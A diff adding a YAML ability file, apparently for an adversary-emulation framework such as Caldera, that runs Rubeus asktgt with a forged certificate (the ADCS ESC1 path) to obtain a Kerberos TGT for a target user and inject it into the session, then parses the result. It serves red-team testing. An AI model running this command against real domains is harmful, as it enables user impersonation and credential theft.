@@ -1,0 +1,29 @@
+- id: ae1831b1-b435-4864-ae7f-rubeus-asktgt
+  name: ESC1 - Use Certificate with Rubeus
+  description: Uses Rubeus to request a TGT using the forged certificate and injects it into memory.
+  tactic: credential-access
+  technique:
+    attack_id: T1550.004
+    name: "Use Alternate Authentication Material: PKINIT"
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+        - source: esc1.target_user
+  platforms:
+    windows:
+      psh:
+        payloads:
+          - Rubeus.exe
+        command: |
+          .\Rubeus.exe asktgt /user:#{esc1.target_user} /certificate:"CN=#{esc1.target_user}" /ptt
+          klist | findstr.exe "#{esc1.target_user}"
+          if ($LASTEXITCODE -eq 0) {
+              Write-Host "TGT-Injection-Success: #{esc1.target_user}"
+          } else {
+              Write-Host "TGT-Injection-Failure: #{esc1.target_user}"
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'da.impersonated'
+              edge_label: 'has_tgt_for'
+              custom_parser_vals:
+                regex: 'TGT-Injection-Success:\s+(.*)'
